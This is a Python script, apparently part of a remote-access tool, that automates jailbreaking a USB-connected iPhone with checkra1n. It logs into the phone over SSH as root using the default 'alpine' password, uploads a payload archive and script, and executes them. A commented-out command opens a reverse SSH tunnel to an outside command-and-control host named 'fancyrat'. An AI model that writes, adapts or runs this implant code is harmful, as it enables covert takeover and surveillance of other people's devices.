from subprocess import Popen, PIPE, check_output
import os
import signal
from paramiko import SSHClient, AutoAddPolicy
from time import sleep


USER=os.getlogin()
TCP_PORT='3434'

class Checkrain:
    def __init__(self):
        self.is_done = False
        self.cmd = ['./checkrain/start.sh']
        #self.inject_cmd = ['iproxy', TCP_PORT,'44']
        self.inject_cmd = '/usr/bin/iproxy ' +TCP_PORT+ ' 44'
        self.handle = None
        self.inject_handle= None
        self.is_injected= False
        self.log = open('log.txt',"w+")
        #all the ssh stuff
        self.client = SSHClient()
        self.client.load_host_keys('/home/'+USER+'/.ssh/known_hosts')
        self.client.load_system_host_keys()
        self.client.set_missing_host_key_policy(AutoAddPolicy())
        self.REMOTE_SSH_CC = 'root@fancyrat.mooo.com'
        self.payload_sent=False

    def pwn(self):
        self.handle = Popen(self.cmd,shell=True, stderr=PIPE, stdin=PIPE, preexec_fn=os.setsid)
        return self.handle.poll()
    def pid(self):
        if self.handle != None:
            return self.handle.pid
        else:
            return None
    def kill(self):
        try:
            os.killpg(os.getpgid(self.handle.pid), signal.SIGTERM)
            self.is_done = False
        except:
            pass
        self.handle = None
        return True
    
    def inject(self):
        if self.is_injected is False:
            self.inject_handle = Popen(self.inject_cmd, shell=True,stdout=PIPE,stderr=PIPE ,preexec_fn=os.setsid)
            #print(self.inject_handle.stderr.read().decode('utf-8'))
            #print(self.inject_handle.stdout.read().decode('utf-8'))
            #self.inject_handle.wait(timeout=12)
            self.is_injected = True
        else:
            pass
        return True

    def inject_pid(self):
        if self.inject_handle is None:
            return None
        else:
            return self.inject_handle.pid

    def kill_inject(self):
        try:
            os.killpg(os.getpgid(self.inject_handle.pid), signal.SIGTERM)
        except:
            pass
        self.inject_handle = None
        return True

    def upload_payload(self):
        self.payload_cmd = ['sshpass','-p','alpine','scp', '-oStrictHostKeyChecking=no',
                           '-q', '-P',TCP_PORT, './payload/payload.tar.gz','./payload/payload.sh', 'root@localhost:~/']
        self.payload_handle = Popen(
            self.payload_cmd, shell=False, stderr=PIPE, stdin=PIPE, preexec_fn=os.setsid,)
        self.payload_handle.wait()
        return True

    def reverse_ssh(self):
        
        if self.payload_sent is False:
            if self.upload_payload() is True:
                self.payload_sent = True
        else: 
            pass
        self.client.connect('localhost',port=TCP_PORT,username='root',password='alpine')
        self.client.exec_command('./payload.sh')
        #self.client.exec_command('uicache -a')
        #self.client.exec_command('killall -9 SpringBoard')
        #self.client.exec_command(
        #    'ssh -f -N -T -R 2022:localhost:44 -oStrictHostKeyChecking=no -i ./payload/fancyrat ' + self.REMOTE_SSH_CC)
        #self.client.exec_command('uicache -a & killall -9 SpringBoard')
        self.client.close()
        self.is_done = True
        return True

    def isdone(self):
        return self.is_done



